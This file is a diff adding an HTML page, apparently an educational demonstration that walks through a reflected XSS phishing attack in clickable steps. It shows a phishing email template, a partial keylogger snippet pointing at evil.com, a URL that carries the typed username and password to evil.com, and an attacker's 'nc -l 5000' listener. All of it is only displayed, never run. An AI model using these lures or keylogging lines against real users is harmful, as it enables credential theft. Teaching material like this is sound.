@@ -1,0 +1,236 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+<head>
+    <title>WEBSPECTION</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+
+    <meta charset="UTF-8">
+    <meta name="description" content="Clean and responsive administration panel">
+    <meta name="keywords" content="Admin,Panel,HTML,CSS,XML,JavaScript">
+    <meta name="author" content="Erik Campobadal">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="css/uikit.min.css" />
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <link rel="stylesheet" href="css/style.css" />
+    <script src="js/uikit.min.js"></script>
+    <script src="js/uikit-icons.min.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro&display=swap" rel="stylesheet">
+    <style>
+        .uk-card-default:hover {
+            background-color: #e7e6f5;
+            cursor: pointer;
+        }
+    </style>
+    <style>
+        pre.bash {
+            background-color: black;
+            color: white;
+            font-size: medium;
+            font-family: Consolas, Monaco, Lucida Console, Liberation Mono, DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace;
+            width: 100%;
+            display: inline-block;
+            text-align: left;
+        }
+
+        p {
+            font-size: small;
+        }
+
+        .colored {
+            color: #6e63fe;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="uk-child-width-1-3@m uk-grid-small uk-grid-match" uk-grid>
+        <div id="descbar" class="uk-card uk-card-default uk-card-body uk-width-1-1@m">
+            <p id="description"><span style="color:#6e63fe">Reflected XSS</span><br><br>An attacker crafts a malicious link and sends users an email with that link to a website
+                vulnerable to
+                the XSS exploit</p>
+        </div>
+    </div>
+    <div class="uk-child-width-1-3@m uk-grid-small uk-grid-match" uk-grid>
+        <div id="xssEmailDiv" class="uk-card uk-card-default uk-card-body uk-width-1-2@m">
+            <form>
+
+                <fieldset class="uk-fieldset">
+
+                    <legend class="uk-legend"><b style="color: #821616;">Attacker Email</b></legend>
+
+                    <div class="uk-margin">
+                        <b style="color: #821616;">To:</b> <input class="uk-input" type="text"
+                            placeholder="victim@email.com" value="victim@email.com" disabled>
+                    </div>
+
+                    <div class="uk-margin">
+                        <b style="color: #821616;">Subject: </b><input class="uk-input" type="text"
+                            placeholder="Subject">
+                    </div>
+
+                    <div class="uk-margin">
+                        <textarea class="uk-textarea" rows="7"
+                            placeholder="Dear Customer,&#013; &#010;We regret to inform you that your account has been restricted. To continue using our services please download the file attached to this email and update your login information.&#013; &#010;https://website.com?&lt;script&gt;malicious script&lt;/script&gt;"></textarea>
+                    </div>
+                    <input id="xssemail" class="uk-button uk-button-primary" type="button"
+                        style="background-color: #821616;" value="Sent Malicious Email" />
+                </fieldset>
+            </form>
+        </div>
+
+        <div id="victimEmail" class="uk-card uk-card-default uk-card-body uk-width-1-2@m">
+            <form>
+
+                <fieldset class="uk-fieldset">
+
+                    <legend class="uk-legend"><b style="color: #68e1fd;">Victim Email</b></legend>
+
+
+
+                    <div class="uk-margin">
+                        <b style="color: #68e1fd;">From : </b> attacker@email.com
+                    </div>
+                    <div class="uk-margin">
+                        <b style="color: #68e1fd;">Subject : </b>Recover Your Account
+                    </div>
+                    <div class="uk-margin">
+                        Dear Customer,<br><br>
+                        We regret to inform you that your account has been restricted. To continue using our services
+                        please download the file attached to this email and update your login information.<br><br>&#013;
+                        &#010;
+                        <a>
+                            https://website.com?&lt;script&gt;malicious script&lt;/script&gt;"></a>
+                    </div>
+                    <input id="openemail" class="uk-button uk-button-primary" type="button"
+                        style="background-color: #68e1fd;" value="Open URL in the Email" />
+                </fieldset>
+            </form>
+        </div>
+
+        <div id="loginpage" class="uk-card uk-card-default uk-card-body uk-width-1-2@m">
+            <form>
+
+                <fieldset class="uk-fieldset">
+
+                    <legend class="uk-legend"><b style="color: #606161;">Website Login Page</b></legend>
+
+                    <div class="uk-margin">
+                        <b style="color: #606161;">User Name</b> <input id="username" class="uk-input" type="text"
+                            placeholder="victim@email.com" value="victim@email.com">
+                    </div>
+
+                    <div class="uk-margin">
+                        <b style="color: #606161;">Password</b><input id="password" class="uk-input" type="password"
+                            placeholder="Subject">
+                    </div>
+
+                    <input id="logintowebsite" class="uk-button uk-button-primary" type="button"
+                        style="background-color: #606161;" value="Login" />
+
+                    <div class="uk-margin" style="opacity: 0.3;">
+                        <b style="color: #821616;">Hidden Malicious Script (Keylogger):</b><br>
+                        var buffer = [];
+                        var attacker = 'http://evil.com/?c='
+
+                        document.onkeypress = function(e) {
+                        var timestamp = Date.now() | 0;
+                        var stroke = {
+                        k: e.key,
+                        t: timestamp
+                        };
+                        buffer.push(stroke);
+                        }
+                        <div class="uk-margin">
+                </fieldset>
+            </form>
+
+        </div>
+
+        <div id="loginsuccess" class="uk-card uk-card-default uk-card-body uk-width-1-2@m">
+            <form>
+
+                <fieldset class="uk-fieldset">
+
+                    <legend class="uk-legend"><b style="color: #606161;">Website Login Page</b></legend>
+
+                    <div class="uk-margin">
+                        You Login Successfully
+                    </div>
+                    <div class="uk-margin" style="opacity: 0.3;">
+                        <b style="color: #821616;">Hidden Malicious Script (Keylogger):</b><br>
+                        Username and Passowrd is sent to <b id="maliurl" style="color: #821616;">http://evil.com/?c=</b>
+                        <div class="uk-margin">
+                            <input id="gototerminal" class="uk-button uk-button-primary" type="button"
+                                style="background-color: #821616; opacity: 0.5;" value="Go to Attacker Terminal" />
+                </fieldset>
+            </form>
+
+        </div>
+
+        <div id="terminal" class="uk-card uk-card-default uk-card-body uk-width-1-2@m">
+            <fieldset class="uk-fieldset">
+                <legend class="uk-legend"><b style="color: #821616;">Hacker Terminal</b></legend>
+                <div class="uk-margin">
+                    <pre class="bash">
+root@ubuntu:~# nc -l 5000
+Start listening http://127.0.0.1:5000
+Username: <span id="terusername"> felix </span>
+Password: <span id="terpassword"> </span>
+                    </pre>
+                </div>
+            </fieldset>
+        </div>
+
+        <div id="" class="uk-card uk-card-default uk-card-body uk-width-1-2@m">
+            <img id="z" data-src="images/z.png" width="1800" height="1200" alt="" uk-img>
+        </div>
+    </div>
+    <script>
+        $("#victimEmail").hide();
+        $("#loginpage").hide();
+        $("#loginsuccess").hide();
+        $("#terminal").hide();
+
+        $("#xssemail").click(function () {
+            $("#xssEmailDiv").hide();
+            $("#victimEmail").show();
+            //.hide("slow");
+            // action goes here!!
+            $("#z").fadeOut('slow');
+            $("#z").attr("data-src", "images/a.png").fadeIn('');
+            $("#description").html("The email claims that the user’s account has been restricted. Instructions are given to go to https://website.com?&lt;script&gt;malicious script&lt;/script&gt; to recover their account.")
+        });
+        $("#openemail").click(function () {
+            $("#victimEmail").hide();
+            $("#loginpage").show();
+            $("#z").fadeOut('');
+            $("#z").attr("data-src", "images/b.png").fadeIn('');
+            $("#description").html("When the user visit website.com, a bogus page appearing exactly like the real login page, where both new and existing passwords are requested. However, a keylogger is injected to the page, hacker can hijack the username and password to gain access.")
+        });
+
+        $("#logintowebsite").click(function () {
+            $("#loginpage").hide();
+            $("#loginsuccess").show();
+            $("#z").fadeOut('');
+            $("#z").attr("data-src", "images/c.png").fadeIn('');
+            $("#description").html("Although the website shown you login successfully. The username and password have been sent to the attacker.");
+            $("#maliurl").html("http://evil.com/?username=" + $("#username").val() + "&password=" + $("#password").val());
+        });
+
+        $("#gototerminal").click(function () {
+            $("#loginsuccess").hide();
+            $("#terminal").show();
+            $("#z").fadeOut('');
+            $("#z").attr("data-src", "images/d.png").fadeIn('');
+            $("#description").html("The password is shown in the attacker's terminal. In other words, the attacker has stole the user's credential.");
+            $("#terusername").html($("#username").val());
+            $("#terpassword").html($("#password").val());
+        });
+    </script>
+</body>
+
+</html>
